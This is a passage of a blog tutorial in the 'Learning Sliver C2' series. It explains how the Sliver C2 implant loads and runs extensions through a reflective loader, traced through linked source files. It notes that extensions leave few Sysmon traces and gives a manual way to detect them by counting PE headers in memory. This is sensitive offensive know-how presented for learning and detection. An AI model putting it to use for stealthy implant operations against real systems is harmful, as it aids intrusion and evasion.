+<code>ListExtensions</code> gets the list of loaded extensions from an implant,
+<code>RegisterExtension</code> loads an extension and <code>CallExtension</code> runs it.
+Server-side they are all handled in <code>server/rpc/rpc-extensions.go</code>
+(<a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/server/rpc/rpc-extensions.go">source</a>).
+The server merely passes them unmodified to the implant using its
+<a href="https://github.com/BishopFox/sliver/blob/c7c802709147d93667f03ac5bd7ad31891fc479b/server/rpc/rpc.go#L101">GenericHandler</a>.</p>
+<p>It&rsquo;s important to note what the server does not do.
+Firstly, the server is unaware of any extensions that may have been installed.
+This feature is exclusive to the client and every operator can customize their own environment according to their needs.
+Additionally, the server does not remember the extensions that have been registered (loaded) in an implant.
+Only the implant itself keeps track of that.
+The server just brokers the communication.</p>
+<h3 id="sliver-implant">Sliver implant</h3>
+<p>The implant has (Windows) handlers for all three RPC calls registered
+<a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/implant/sliver/handlers/handlers_windows.go#L104">here</a>
+in <code>implant/sliver/handlers/handlers_windows.go</code>,
+which all refer to the <a href="https://github.com/BishopFox/sliver/tree/749f71d226e5bd239d6513feeb99faf6804a8d28/client/command/extensions">extension package</a>.
+The <a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/implant/sliver/handlers/handlers_windows.go#L734">listExtensionsHandler</a>
+for example uses a generic
+<a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/implant/sliver/extension/extension.go#L42">List</a>
+function to list the extensions.</p>
+<p>The <a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/implant/sliver/handlers/handlers_windows.go#L691">registerExtensionsHandler</a>
+is Windows-specific and registers a new Windows extension,
+which provides a function <a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/implant/sliver/extension/extension_windows.go#L69">Load</a>
+that calls out to the reflective loader and optionally calls an exported function if you specified one in &ldquo;extension.json&rdquo; (with <code>init</code>).
+The loader lives in a separate repository <a href="https://github.com/moloch--/memmod">memmod</a>,
+specifically <a href="https://github.com/moloch--/memmod/blob/fd77d905589eb2b2560ee14ca9ada1748859b93e/memmod_windows.go#L458">here</a>.
+Read through the code and if you also read the sections on Donut in
+<a href="../../post/learning_sliver_c2_10_sideload/#inside-donut">post 10</a>
+or the reflective loader in <a href="../../post/learning_sliver_c2_11_spawndll/#review-of-the-reflective-loader">post 11</a>
+then you notice a lot of similarities.
+I&rsquo;ve only skimmed it but it seemed to me that this loader does all the things the others do too.</p>
+<p>Finally, the <a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/implant/sliver/handlers/handlers_windows.go#L709">callExtensionHandler</a>
+uses the <a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/implant/sliver/extension/extension.go#L50">Run</a>
+extension function, which forwards to the Windows-specific
+<a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/implant/sliver/extension/extension_windows.go#L95">Call</a>
+function.
+Here we set up a callback function for output retrieval (the one we will eventually call from the DLL),
+resolve the address of the entrypoint function and call it with the arguments string and callback as parameters
+(<a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/implant/sliver/extension/extension_windows.go#L120">here</a>).
+The callback calls the <code>onFinish</code> function which was passed as an argument to
+<a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/implant/sliver/extension/extension.go#L50">Run</a>
+within the handler (see <a href="https://github.com/BishopFox/sliver/blob/749f71d226e5bd239d6513feeb99faf6804a8d28/implant/sliver/handlers/handlers_windows.go#L718">here</a>).
+This is how the output is sent back to the server.</p>
+<h2 id="detection">Detection</h2>
+<p>In previous posts I ran Sysmon
+with a medium verbosity <a href="https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml">configuration file</a>
+(sysmon-modular) to see what telemetry you can expect when using using Sliver implant features.
+If you don&rsquo;t yet have Sysmon, see <a href="../../post/learning_sliver_c2_06_stagers_process_injection/#detection">here</a> for installation instructions.
+I also like to keep a fully-featured Windows Defender enabled to see if it kills anything.</p>
+<p>While commands like <code>sideload</code> and <code>spawndll</code> where not immediately blocked by Defender there was always
+some nice Sysmon output created by these commands.
+New processes were spawned and <code>CreateRemoteThread</code> was called while injecting code into them.
+All of this was clearly visible in the Sysmon logs.</p>
+<p>If you run Sysmon while using an extension you do not see that much anymore.
+In fact I could not see anything related to this feature.
+Extensions seems to be a lot more stealthy than other ways of running 3rd party code.</p>
+<p>Of course you may very well find something created by the behaviour of a particular extension.
+For example, if your extension spawns a new process and injects something into it, you get the same indicators
+we saw in the previous posts.
+However, the way in which a Sliver implant runs extensions in general did not leave many traces in my setup.</p>
+<p>One thing you could look for manually is the number of PE headers you find in memory.
+For example, do the following.
+Start a fresh beacon and open its process in <a href="https://processhacker.sourceforge.io/">Process Hacker</a>.
+Then search the private memory for strings and filter by &ldquo;DOS mode&rdquo;.
+In my case, I found the following 2 strings which look like they are both PE headers:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/38_sliver_c2_extensions/detect_PE_headers_memory.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>A fresh beacon implant had 2 PE headers inside its memory</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Now run an extension like the password prompt extension.
+Search for strings again when it is done and count the DOS headers that are in memory now.
+My process had 13 of them:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/38_sliver_c2_extensions/detect_PE_headers_memory_after.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>A beacon after running the password prompt extension had 13 PE headers in its memory</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>I ran it again and then there were 22.
+Quite a large number of those.
+Look for the &ldquo;DOS mode&rdquo; string in normal processes and you are lucky if you find one at all.</p>
+<p>Copying around a PE file of course leaves these kinds of traces.
+Unfortunately they disappear after a while.
+If you would look at the right moment in time you may see this.
+But your chances are slim.</p>
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2023-03-23T00:00:00&#43;00:00">
+    23 Mar, 2023
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/c2/">c2</a> and <a href="/categories/sliver/">sliver</a></span>
+  
+  
+    and tagged <a href="/tags/c2/">c2</a>, <a href="/tags/dll/">DLL</a>, <a href="/tags/extensions/">extensions</a>, <a href="/tags/implant/">implant</a>, <a href="/tags/pe/">PE</a>, <a href="/tags/sliver/">sliver</a> and <a href="/tags/tutorial/">tutorial</a>
+  
+  using <span itemprop="wordCount">4978</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/learning_sliver_c2_11_spawndll/">Learning Sliver C2 (11) - SpawnDLL</a>
+        <time datetime="15M">15 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_10_sideload/">Learning Sliver C2 (10) - Sideload</a>
+        <time datetime="37M">37 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_09_execute_assembly/">Learning Sliver C2 (09) - Execute Assembly</a>
+        <time datetime="29M">29 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_08_implant_basics/">Learning Sliver C2 (08) - Implant Basics</a>
+        <time datetime="20M">20 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_06_stagers_process_injection/">Learning Sliver C2 (07) - Stagers: Process Injection</a>
+        <time datetime="22M">22 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_06_stagers/">Learning Sliver C2 (06) - Stagers: Basics</a>
+        <time datetime="26M">26 minutes</time>
+      
+        <li><a href="/post/learning_sliver_c2_05_transports_in_detail_dns/">Learning Sliver C2 (05) - Transports in Detail: DNS</a>
+        <time datetime="9M">9 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
